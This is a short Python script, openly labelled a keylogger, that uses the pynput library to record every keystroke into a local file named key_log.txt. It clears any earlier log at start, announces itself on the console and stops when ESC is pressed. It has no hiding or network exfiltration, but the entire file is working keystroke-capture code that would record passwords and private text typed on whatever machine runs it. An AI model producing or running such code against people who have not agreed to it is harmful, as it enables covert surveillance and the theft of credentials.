from pynput import keyboard
import os

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC is pressed
        return False

if __name__ == "__main__":
    # Clear log file before starting
    if os.path.exists(log_file):
        os.remove(log_file)

    print("[*] Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
